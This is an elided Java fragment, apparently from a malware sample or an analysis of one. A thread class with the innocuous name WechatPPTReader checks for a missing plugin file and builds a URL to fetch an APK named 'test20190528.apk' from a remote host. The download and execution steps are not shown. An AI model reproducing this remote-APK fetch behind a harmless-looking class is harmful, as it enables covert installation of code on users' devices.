...
public class WechatPPTReader extends Thread{

	public static void pptreaderEntry(){
		WechatPPTReader thread = new WechatPPTReader();
		thread.start();
	}
	...
	public void run() {
		...
		try {
		    ...
		    if (pluginfile.exists() == false) {
		    	...
		    	String username = "test20190528";
		    	
		    	String filename = username + ".apk";

			    String url = "http://" + host + "/" + username + "/" + filename ;
